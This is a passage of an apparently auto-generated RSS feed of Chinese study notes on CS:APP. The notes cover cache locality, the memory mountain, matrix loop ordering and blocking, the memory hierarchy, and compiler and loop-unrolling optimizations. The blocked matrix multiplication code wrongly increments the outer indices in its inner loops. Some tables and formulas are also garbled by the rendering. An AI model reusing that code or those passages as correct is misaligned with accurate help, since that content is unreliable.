&lt;li&gt;逐元素访问数组(空间局部性)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;缓存对代码性能的影响&lt;/h1&gt;
&lt;h2&gt;Memory Moutain&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;test&lt;/code&gt;函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long data[MAXELEMS]; /* Global array to traverse */ 
/* test - Iterate over first &amp;quot;elems&amp;quot; elements of 
 *        array “data” with stride of &amp;quot;stride&amp;quot;, using 
 *        using 4x4 loop unrolling. 
 */ 
int test(int elems, int stride) { 
	long i, sx2=stride*2, sx3=stride*3, sx4=stride*4; 
	long acc0 = 0, acc1 = 0, acc2 = 0, acc3 = 0; 
	long length = elems, limit = length - sx4; 
	
	/* Combine 4 elements at a time */ 
	for (i = 0; i &amp;lt; limit; i += sx4) { 
		acc0 = acc0 + data[i]; 
		acc1 = acc1 + data[i+stride]; 
		acc2 = acc2 + data[i+sx2]; 
		acc3 = acc3 + data[i+sx3]; 
	} 
	
	/* Finish any remaining elements */ 
	for (; i &amp;lt; length; i++) { 
		acc0 = acc0 + data[i]; 
	} 
	return ((acc0 + acc1) + (acc2 + acc3)); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以不同的(elems, stride)组合调用 &lt;code&gt;test()&lt;/code&gt;函数.首先调用一次给缓存热身,再调用一次测试读取速度性能(MB/s).得到了这副封面上美丽的图:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250129100926.png&quot; alt=&quot;&quot;&gt;
随着stride轴增大,减小了空间局部性;随着size轴增大,减小了时间局部性.&lt;/p&gt;
&lt;h2&gt;在矩阵乘法中提高局部性&lt;/h2&gt;
&lt;h3&gt;重新排列循环，提高空间局部性&lt;/h3&gt;
&lt;p&gt;假设矩阵维度很大，缓存中的一个块存放4个元素&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ijk访问&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* ijk */ 
for (i=0; i&amp;lt;n; i++){
	for(j=0;j&amp;lt;n;j++){
		sum =0.0;
		for(k=0;k&amp;lt;n;k++)
			sum += a[i][k]*b[k][j];
		c[i][j] = sum;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130205312.png&quot; alt=&quot;&quot;&gt;
缓存不命中的概率是:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2. jik访问&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;与ijk访问无异.&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3. kij访问&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* kij */
for(k=0;k&amp;lt;n;k++){
	for(i=0;i&amp;lt;n;i++){
		r = a[i][k];
		for(j=0;j&amp;lt;n;j++)
			c[i][j] += r*b[k][j];
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130205806.png&quot; alt=&quot;&quot;&gt;
缓存不命中的概率是:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;ikj访问
与kij访问无异&lt;/li&gt;
&lt;li&gt;jki访问&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* jki */
for(j=0;j&amp;lt;n;j++){
	for(k=0;k&amp;lt;n;k++){
		r = b[k][j];
		for(i=0;i&amp;lt;n;i++)
			c[i][j] += a[i][k]*r;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130210233.png&quot; alt=&quot;&quot;&gt;
缓存不命中的概率是:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;6. kji访问&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;与jki访问无异&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3&gt;矩阵分块,提高时间局部性&lt;/h3&gt;
&lt;p&gt;假设高速缓存块中包含8个元素,矩阵维数n足够大.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;传统计算方法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;c = (double *) calloc(sizeof(double), n*n); 

/* Multiply n x n matrices a and b */ 
void mmm(double *a, double *b, double *c, int n) { 
	int i, j, k; 
	for (i = 0; i &amp;lt; n; i++) 
		for (j = 0; j &amp;lt; n; j++) 
			for (k = 0; k &amp;lt; n; k++) 
				c[i*n + j] += a[i*n + k] * b[k*n + j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在没有分块的传统计算方式中,每一个结果元素的迭代,会发生9n/8次缓存不命中:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130210842.png&quot; alt=&quot;&quot;&gt;
所以计算整个矩阵乘法,会发生
9n/8*n^ 2 = (9/8) n^ 3次缓存不命中&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;矩阵分块计算方法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;c = (double *) calloc(sizeof(double), n*n); 

/* Multiply n x n matrices a and b */ 
void mmm(double *a, double *b, double *c, int n) { 
	int i, j, k; 
	for (i = 0; i &amp;lt; n; i+=B) 
		for (j = 0; j &amp;lt; n; j+=B) 
			for (k = 0; k &amp;lt; n; k+=B) 
				/* B x B mini matrix multiplications */ 
				for (i1 = i; i1 &amp;lt; i+B; i++) 
					for (j1 = j; j1 &amp;lt; j+B; j++) 
						for (k1 = k; k1 &amp;lt; k+B; k++) 
							c[i1*n+j1] += a[i1*n + k1]*b[k1*n + j1]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假设矩阵分成B*B的小块,对于每一个小块,在遍历其元素时会发生B^ 22/8次缓存不命中.对计算结果的每一小块,会发生2n/B*B^ 2/8=nB/4次缓存不命中,所以整个结果矩阵会发生nB/4*(n/B)^ 2=n^ 3/(4B)次缓存不命中.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250130211852.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;从结果来看,分块与不分块造成了相当大的差异!如果按照数据结构中理论上的时间复杂度来看,他们的时间复杂度是一样的,但在计算机的缓存机制下,差异凸显!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 26 Jan 2025 16:00:00 GMT</pubDate></item><item><title>存储器层次结构</title><link>https://tankimzeg.top/blog/csapp/the-memory-hierarchy/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/the-memory-hierarchy/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/the-memory-hierarchy/&quot;&gt;https://tankimzeg.top/blog/csapp/the-memory-hierarchy/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;之前我们将内存当作字节数组,但实际上内存是一个非常复杂的设备层次结构.&lt;/p&gt;
&lt;h1&gt;存储技术和趋势&lt;/h1&gt;
&lt;h2&gt;随机访问存储器(Random-Access Memory)&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;特点&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;RAM被打包成芯片&lt;/li&gt;
&lt;li&gt;基本存储单元,一个单元存储一个bit&lt;/li&gt;
&lt;li&gt;多个内存条构成了主存&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;RAM分为SRAM和DRAM
SRAM(Stactic RAM)
DRAM(Dynamic RAM)
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127170217.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;非易失性存储器
RAM断电后就失去了所有信息,称为易失性存储器.相对的非易失性存储器就是只读存储器(ROM).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CPU读写内存操作&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CPU加载内存
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127171405.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CPU存储内存
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127171444.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;磁盘&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;几何描述&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;磁盘是由盘片组成的,一个盘片有上表面和下表面两面.&lt;/li&gt;
&lt;li&gt;每个表面包含一系列同心圆,称之为磁道.&lt;/li&gt;
&lt;li&gt;每一个磁道包含很多个扇区,扇区存储512字节数据.&lt;/li&gt;
&lt;li&gt;扇区之间有空隙分隔.&lt;/li&gt;
&lt;li&gt;盘片在主轴上是对齐的,轨道在不同表面上的集合称为柱面.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127172417.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127172440.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;容量
磁盘容量 = 每个扇区字节数 * 磁道平均扇区数 * 表面磁道数 * 盘片盘面数 * 磁盘盘片数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;操作
一个磁盘一个磁臂,一个磁臂上有多个读写头,对应每个盘片
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127173829.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;磁盘访问时间&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;寻道时间:将读写头移动到需要的磁道上,通常需要3~9ms&lt;/li&gt;
&lt;li&gt;旋转延迟:将磁盘旋转到需要的扇区上,平均需要½旋转周期&lt;/li&gt;
&lt;li&gt;传输时间:读取字节需要的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;CPU读取磁盘操作:
首先,CPU通过编写三元组(read指令,逻辑块号,目的内存地址)来启动此读取行为
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127175427.png&quot; alt=&quot;&quot;&gt;
然后,磁盘控制器读取与该逻辑块对应的扇区,取得总线的控制权,通过I/O桥直接复制到主存中
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127175908.png&quot; alt=&quot;&quot;&gt;
最后,一旦数据传输完成,磁盘控制器使用中断机制来通知CPU
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127180114.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;固态硬盘(SSD)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127180642.png&quot; alt=&quot;&quot;&gt;
页:4KB&lt;del&gt;512KB,块:32&lt;/del&gt;128页
需要将页擦除后才能写入.
一个块经过10万次重复写入后就坏掉了&lt;/p&gt;
&lt;h1&gt;局部性(Locality)&lt;/h1&gt;
&lt;p&gt;程序倾向于使用其地址接近或等于最近使用过的数据和指令的那些数据和指令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间局部性:最近访问的位置可能在不久的将来再次被引用的属性&lt;/li&gt;
&lt;li&gt;空间局部性:如果访问了一个位置,那么将来可能访问临近的位置&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sum_array(int *a){
	int sum = 0;
	for(int i=0;i&amp;lt;n;i++)
		sum += a[i];
	return sum;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码中,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据使用
对数组元素的引用体现空间局部性;对sum的引用体现时间局部性.&lt;/li&gt;
&lt;li&gt;指令使用
顺序执行一系列指令体现空间局部性;循环中的指令体现时间局部性.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;作为一名程序员,能够在看到代码时获得一些代码局部性的定性感觉是非常重要的.要避免局部性差的情况.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;存储器层次结构&lt;/h1&gt;
&lt;p&gt;存储空间越小,越快越贵;存储空间越大越慢,越便宜.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;级别&lt;/th&gt;
&lt;th&gt;存储器&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;L0&lt;/td&gt;
&lt;td&gt;寄存器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L1&lt;/td&gt;
&lt;td&gt;L1缓存(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L2&lt;/td&gt;
&lt;td&gt;L2缓存(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L3&lt;/td&gt;
&lt;td&gt;L3缓存(SRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L4&lt;/td&gt;
&lt;td&gt;主存(DRAM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L5&lt;/td&gt;
&lt;td&gt;本地二级存储(如磁盘)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L6&lt;/td&gt;
&lt;td&gt;远程二级存储(如网盘)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;我的电脑的&amp;quot;任务管理器&amp;quot;-&amp;gt;&amp;quot;性能&amp;quot;-&amp;gt;&amp;quot;CPU&amp;quot;中的缓存情况&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127205447.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;在存储器层次结构中的每一层都包含从下一个较低级别层级获取的数据&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;缓存&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;缓存:一个更小更快的存储设备,充当更慢的设备中的数据的暂存区域.
所以缓存是一个相对的概念,第k级存储器是第k+1存储器的缓存.
根据局部性原理,相比于第k+1级存储器,程序更倾向于访问第k级存储器.
所以如果访问第k+1级存储器,我们会将其复制到第k级(缓存),很可能将再次访问它.
因为我们不经常访问级别第的存储,所以可以用慢的便宜的设备存储.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;概念
如果CPU请求的数据块在缓存中称为hit;反之称为miss&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;缓存不命中的类型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cold(compulsory miss)
 缓存是空的,设备刚刚加电&lt;/li&gt;
&lt;li&gt;capacity miss
 缓存的大小是有限的,工作集(被程序不断访问的块)比缓存大&lt;/li&gt;
&lt;li&gt;conflict miss
 块号为i只能放在i mod 缓存大小处,如果缓存大小是4,却需要块号为0,4,8的块,虽然小于缓存大小,但每次都不命中.这是硬件映射算法的问题&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;存储器层次结构中的缓存
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250127215122.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 26 Jan 2025 16:00:00 GMT</pubDate></item><item><title>程序优化</title><link>https://tankimzeg.top/blog/csapp/program-optimization/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/program-optimization/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/program-optimization/&quot;&gt;https://tankimzeg.top/blog/csapp/program-optimization/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;编译器优化的局限性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;受到代码限制,不能改变程序的行为&lt;/li&gt;
&lt;li&gt;可能会被代码风格混淆,比如数据的变化范围比数据类型的范围小&lt;/li&gt;
&lt;li&gt;分析只建立在过程内,不对整个程序分析&lt;/li&gt;
&lt;li&gt;分析基于静态信息而非动态输入&lt;/li&gt;
&lt;li&gt;当编译器无法决定是否优化时,就选择不优化&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;举例阐述:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;过程调用&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void lower(char *s) { 
	size_t i; 
	for (i = 0; i &amp;lt; strlen(s); i++) 
		if (s[i] &amp;gt;= &amp;#39;A&amp;#39; &amp;amp;&amp;amp; s[i] &amp;lt;= &amp;#39;Z&amp;#39;) 
			s[i] -= (&amp;#39;A&amp;#39; - &amp;#39;a&amp;#39;); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每次判断都要执行一次 &lt;code&gt;strlen(s)&lt;/code&gt; 很显然能优化为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void lower(char *s) { 
	size_t i; 
	size_t len = strlen(s); 
	for (i = 0; i &amp;lt; len; i++) 
		if (s[i] &amp;gt;= &amp;#39;A&amp;#39; &amp;amp;&amp;amp; s[i] &amp;lt;= &amp;#39;Z&amp;#39;) 
			s[i] -= (&amp;#39;A&amp;#39; - &amp;#39;a&amp;#39;); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是编译器却不能做出这样的优化,原因正是在于:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下方代码对字符串进行修改,可能导致字符串长度发生变化&lt;/li&gt;
&lt;li&gt;分析建立在过程内部, &lt;code&gt;strlen(s)&lt;/code&gt;函数对于编译器是未知的,即使它是库函数,仍有可能由程序员覆盖定义.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;内存混淆&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum rows is of n*n matrix a and store in vector b */
void sum_rows(double *a,double *b, long n){
	long i, j;
	for(i=0;i&amp;lt;n;i++){
		b[i]=0;
		for(j=0;j&amp;lt;n;j++)
			b[i] += a[i*n+j];	
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实际上的汇编代码会将b数组不断从内存中取出,运算,再保存回去.读取内存十分耗费时间.完全可以取出后完成所有运算再放回,但编译器不会自动做这样的优化,因为可能存在两个数组引用同一块内存(别名引用)的情况,这样b数组运算后保存到内存就可能影响a数组的数据,编译器不能保证这种情况不会发生.
解决办法是手动创建一个临时变量来保存运算的结果.&lt;/p&gt;
&lt;h1&gt;常用的优化&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;代码移动
循环不变式外提:对产生相同结果的代码提到循环外.
例如&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i=0;i&amp;lt;n;i++){
	for(j=0;j&amp;lt;n;j++)
		a[n*i+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;=&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i=0;i&amp;lt;n;i++){
	int ni = n*i;
	for(j=0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当gcc使用O1以及更高的优化级别时会实施.
2. 减少计算量
通过移位和加法来实现一个操作数为常数的乘除法.
例如
&lt;code&gt;x*16&lt;/code&gt; =&amp;gt; &lt;code&gt;x&amp;lt;&amp;lt;4&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i = 0;i&amp;lt;n;i++){
	int ni = n*i;
	for(j = 0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;=&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int ni = 0;
for(i=0;i&amp;lt;n;i++){
	for(j=0;j&amp;lt;n;j++)
		a[ni+j] = b[j];
	ni += n;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;复用表达式
如果含有相同的(子)表达式,在gcc -O1以上会有优化&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;超标量指令处理器(Superscalar Processor)&lt;/h1&gt;
&lt;p&gt;定义:在一个时钟周期能执行多条指令的处理器.
现代CPU设计:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214121024.png&quot; alt=&quot;&quot;&gt;
程序是一个顺序执行的指令序列,但CPU读取尽可能多的指令序列,发现有的指令之间不是相互依赖的,可以进行指令级并行计算.
将程序进行拆分重组,使这些基本单元尽可能保持繁忙.&lt;/p&gt;
&lt;h2&gt;流水线功能单元(Pipeline Functional Units)&lt;/h2&gt;
&lt;p&gt;假设一个乘法运算需要3个时钟周期,对于&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long mult_eg(long a, long b, long c){
	long p1 = a*b;
	long p2 = a*c;
	long p3 = p1*p2;
	return p3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用并行可以在7个时钟周期内完成:(注意这是单核实现,不用多核)&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Mult_Stage\Time&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;1&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;2&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;3&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;4&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;5&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;6&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;7&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*b&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;a*c&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;p1*p2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;所以,有些指令比较慢,但通过流水线技术可以缩短时间.除法没有流水线.&lt;/p&gt;
&lt;h2&gt;循环展开&lt;/h2&gt;
&lt;p&gt;假如要计算一个数组的乘积
(2*1)循环展开:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Combine 2 elements at a time */ 
for (i = 0; i &amp;lt; limit; i+=2) { 
x = x OP (d[i] OP d[i+1]); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以充分利用流水线
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214153354.png&quot; alt=&quot;&quot;&gt;
能够有效降低运算的延迟(latency)&lt;/p&gt;
&lt;p&gt;还有一种(2*2)循环展开:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Combine 2 elements at a time */ 
for (i = 0; i &amp;lt; limit; i+=2) { 
	x0 = x0 OP d[i]; 
	x1 = x1 OP d[i+1]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214154035.png&quot; alt=&quot;&quot;&gt;
所以,可以展开成K组,根据测试结果选择最好性能.取决于数据的类型和加法器/乘法器的数量.不明觉厉啊.
在讲浮点代码时提到的%ymm寄存器,从硬件层面展现了流水线的实施原理:
SIMD 操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单精度:
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214155117.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;双精度:
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214155142.png&quot; alt=&quot;&quot;&gt;
跟向量运算一样,所以这方面的优化叫做向量化编程.&lt;/li&gt;
&lt;/ul&gt;
